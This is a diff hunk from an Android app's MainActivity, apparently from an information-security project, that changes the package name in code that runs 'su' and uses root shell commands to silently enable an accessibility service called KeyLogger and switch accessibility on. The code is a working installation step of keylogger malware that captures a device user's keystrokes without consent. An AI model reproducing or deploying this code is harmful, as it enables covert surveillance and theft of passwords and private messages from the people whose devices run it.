@@ -40,7 +40,7 @@ public class MainActivity extends AppCompatActivity {
             try {
                 Process process = Runtime.getRuntime().exec("su");
                 DataOutputStream os = new DataOutputStream(process.getOutputStream());
-                os.writeBytes("settings put secure enabled_accessibility_services com.maemresen.infsec.publisher/com.maemresen.infsec.publisher.KeyLogger\n");
+                os.writeBytes("settings put secure enabled_accessibility_services com.maemresen.infsec.keylogapp/com.maemresen.infsec.keylogapp.KeyLogger\n");
                 os.flush();
                 os.writeBytes("settings put secure accessibility_enabled 1\n");
                 os.flush();
